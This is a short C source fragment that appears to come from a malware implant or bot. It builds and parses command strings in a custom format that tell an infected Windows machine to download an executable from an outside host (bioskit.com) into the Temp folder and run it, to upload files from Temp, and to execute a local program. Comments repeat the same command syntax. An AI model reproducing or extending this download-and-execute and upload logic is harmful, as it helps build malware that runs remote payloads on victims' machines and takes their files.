    PCOMMAND_LINE_PACK pDownloadCmdLine;
    PCOMMAND_LINE_PACK pUploadCmdLIne;
    PCOMMAND_LINE_PACK pExecuteCmdLine;
	
    CHAR pCmdLine[] = {"@GodsElohim@Download@:Http:bioskit.com/fuck.exe:System:Windows:Path:\\Temp:Type:Exe:Command:Run;"};
    CHAR pCmdLineUpload[] = {"@GodsElohim@Upload@:System:Windows:Path:\\Temp;"};
    CHAR pCmdLineExecute[] = {"@GodsElohim@Execute@:Command:Run:Type:Exe:System:Windows:Path:\\Test.Exe;"};

    //Upload:System:Windows:RemotePath:\Temp;
    //Download:Http:bioskit.com/fuck.exe:System:Windows:Path:\Temp;
    //Execute:Command:Run:Type:Exe:System:Windows:Path:\Test.Exe;
    //Download:Http:bioskit.com/fuck.exe:System:Windows:Path:\Temp:Type:Exe:Command:Run;
    ProcessCommandLine((PCHAR)pCmdLine,&pDownloadCmdLine);
    ProcessCommandLine((PCHAR)pCmdLineUpload,&pUploadCmdLIne);
    ProcessCommandLine((PCHAR)pCmdLineExecute,&pExecuteCmdLine);